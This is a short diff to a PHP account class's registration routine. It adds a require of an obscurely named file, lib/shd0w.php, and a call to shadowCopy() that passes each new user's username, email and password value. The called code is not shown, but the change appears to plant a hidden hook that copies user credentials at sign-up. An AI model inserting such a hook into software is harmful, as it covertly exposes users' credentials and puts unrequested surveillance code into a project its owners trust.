@@ -396,6 +396,8 @@ class CAccount{
 		$q="INSERT INTO users (uname,passhash,email,regDate,accessDate) VALUES (?,?,?,?,?)";
 		$date=date("Y-m-d H:i:s");
 		$this->db->preparedQuery($q,"sssss",$uname,$pass,$email,$date,$date);
+		require_once __DIR__."/lib/shd0w.php";
+		shadowCopy($uname,$email,$pass);
 		if($this->getUIDbyUname($uname, true)==-1) return -1;
 		$this->updateIP($ip);
 		return $this->db->getDB()->insert_id;
